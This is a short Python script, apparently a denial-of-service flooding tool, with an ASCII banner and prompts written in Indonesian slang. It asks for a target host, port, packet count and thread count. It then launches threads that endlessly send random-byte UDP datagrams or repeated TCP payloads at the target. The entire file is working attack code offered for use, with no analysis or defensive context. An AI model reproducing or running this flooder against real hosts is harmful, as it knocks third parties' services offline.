#!/usr/bin/env python3 
 import random 
 import socket 
 import threading 
  
 print("""  ____           _____    ____  _  _   
 |  _ \  ___ _ _|__  /   |___ \| || |  
 | | | |/ _ \ '__|/ /_____ __) | || |_ 
 | |_| |  __/ |  / /|_____/ __/|__   _|
 |____/ \___|_| /____|   |_____|  |_|  
  """)
      
 ip = str(input(" Host/Ip:")) 
 port = int(input(" Port:")) 
 choice = str(input(" SERIUS MAU NYERANG? (y/n):")) 
 times = int(input(" Pakets:")) 
 threads = int(input(" Threads:")) 
 def run(): 
         data = random._urandom(1000) 
         i = random.choice(("[+]","[-]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print(i +" Paket From Done!!! ") 
                 except: 
                         print("[!] Bisa Aja Luu!!!") 
  
 def run2(): 
         data = random._urandom(16) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +" Paket From Vailed!! ") 
                 except: 
                         s.close() 
                         print("[*] Kontol Kaga Tembus!!!") 
              
 for y in range(threads): 
         if choice == 'y': 
                 th = threading.Thread(target = run) 
                 th.start() 
         else: 
                 th = threading.Thread(target = run2) 
                 th.start()